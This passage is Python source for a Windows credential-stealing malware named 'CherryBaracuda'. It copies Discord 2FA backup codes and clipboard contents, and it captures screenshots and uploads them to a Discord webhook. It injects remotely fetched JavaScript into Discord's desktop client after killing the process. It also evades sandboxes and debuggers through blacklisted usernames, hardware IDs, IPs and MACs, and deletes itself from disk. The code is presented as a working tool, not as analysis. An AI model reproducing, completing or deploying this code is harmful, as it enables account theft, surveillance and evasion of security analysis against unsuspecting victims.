    def get_codes(self):
        if os.path.exists(self.path + self.code_path):
            os.makedirs(os.path.join(temp_path, "Discord"), exist_ok=True)
            with open(os.path.join(temp_path, "Discord", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
                with open(self.path + self.code_path, 'r') as g:
                    for line in g.readlines():
                        if line.startswith("*"):
                            f.write(line)
            f.close()


class AntiSpam:
    def __init__(self):
        if self.check_time():
            sys.exit(0)

    def check_time(self) -> bool:
        current_time = time.time()
        try:
            with open(f"{temp}\\dd_setup.txt", "r") as f:
                code = f.read()
                if code != "":
                    old_time = float(code)
                    if current_time - old_time > 60:
                        with open(f"{temp}\\dd_setup.txt", "w") as f:
                            f.write(str(current_time))
                        return False
                    else:
                        return True
        except FileNotFoundError:
            with open(f"{temp}\\dd_setup.txt", "w") as g:
                g.write(str(current_time))
            return False


class SelfDestruct():
    def __init__(self):
        self.path, self.frozen = self.getfile()
        self.delete()

    def getfile(self):
        if hasattr(sys, 'frozen'):
            return (sys.executable, True)
        else:
            return (__file__, False)

    def delete(self):
        if self.frozen:
            subprocess.Popen('ping localhost -n 3 > NUL && del /F "{}"'.format(self.path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            os._exit(0)
        else:
            os.remove(self.path)


class Clipboard:
    def __init__(self) -> None:
        self.directory = os.path.join(temp_path, "Clipboard")
        os.makedirs(self.directory, exist_ok=True)
        self.get_clipboard()

    def get_clipboard(self) -> None:
        process = subprocess.run("powershell Get-Clipboard", shell=True, capture_output=True)
        if process.returncode == 0:
            content = process.stdout.decode(errors="ignore").strip()
            if content:
                with open(os.path.join(self.directory, "clipboard.txt"), "w", encoding="utf-8") as file:
                    file.write(content)
            else:
                with open(os.path.join(self.directory, "clipboard.txt"), "w", encoding="utf-8") as file:
                    file.write("Clipboard is empty")

#injection not working yet
class Injection:
    def __init__(self, webhook: str) -> None:
        self.appdata = os.getenv('LOCALAPPDATA')
        self.discord_dirs = [
            self.appdata + '\\Discord',
            self.appdata + '\\DiscordCanary',
            self.appdata + '\\DiscordPTB',
            self.appdata + '\\DiscordDevelopment'
        ]
        self.code = requests.get('https://raw.githubusercontent.com/').text

        for proc in psutil.process_iter():
            if 'discord' in proc.name().lower():
                proc.kill()

        for dir in self.discord_dirs:
            if not os.path.exists(dir):
                continue

            if self.get_core(dir) is not None:
                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                    self.start_discord(dir)

    def get_core(self, dir: str) -> tuple:
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue
                        return core, file

    def start_discord(self, dir: str) -> None:
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update, '--processStart', executable],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)


class Debug:
    def __init__(self):
        if self.checks():
            self.self_destruct()

    def checks(self):
        debugging = False

        self.blackListedUsers = ['User01', 'test', 'RGzcBUyrznReg']
        self.blackListedPCNames = ['DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
        self.blackListedHWIDS = ['921E2042-70D3-F9F1-8CBD-B398A21F89C6']
        self.blackListedIPS = ['35.192.93.107']
        self.blackListedMacs = ['4e:81:81:8e:22:4e']
        self.blacklistedProcesses = ["joeboxserver"]

        self.check_process()
        if self.get_network():
            debugging = True
        if self.get_system():
            debugging = True
        return debugging

    def check_process(self) -> bool:
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        if sys.gettrace():
            sys.exit(0)

    def get_network(self) -> bool:
        ip = requests.get('https://api.ipify.org').text
        interface, addrs = next(iter(psutil.net_if_addrs().items()))
        mac = addrs[0].address

        if ip in self.blackListedIPS:
            return True
        if mac in self.blackListedMacs:
            return True

    def get_system(self) -> bool:
        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        hwid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()

        if hwid in self.blackListedHWIDS:
            return True
        if username in self.blackListedUsers:
            return True
        if hostname in self.blackListedPCNames:
            return True

    def self_destruct(self) -> None:
        sys.exit(0)

class Screengrab:
    def __init__(self):
        self.get_inf(__CONFIG__["webhook"])

    def get_inf(self, webhook):
        image = ImageGrab.grab(
            bbox=None,
            all_screens=True,
            include_layered_windows=False,
            xdisplay=None
        )
        image.save(temp_path + "\\desktopshot.png")
        image.close()
        webhook_data = {
            "username": "CherryBaracuda",
            "avatar_url": "https://cdn.discordapp.com/attachments/1192526686718263472/1203308203161419776/3HeZ.gif?size=4096",
            "embeds": [
                {
                    "title": "Screenshot",
                    "image": {
                        "url": "attachment://image.png"
                    }
                }
            ]
        }

        with open(temp_path + "\\desktopshot.png", "rb") as f:
            image_data = f.read()
            encoder = MultipartEncoder({'payload_json': json.dumps(webhook_data), 'file': ('image.png', image_data, 'image/png')})

        requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)

if __name__ == '__main__' and os.name == "nt":
    CherryBaracuda(__CONFIG__["webhook"])
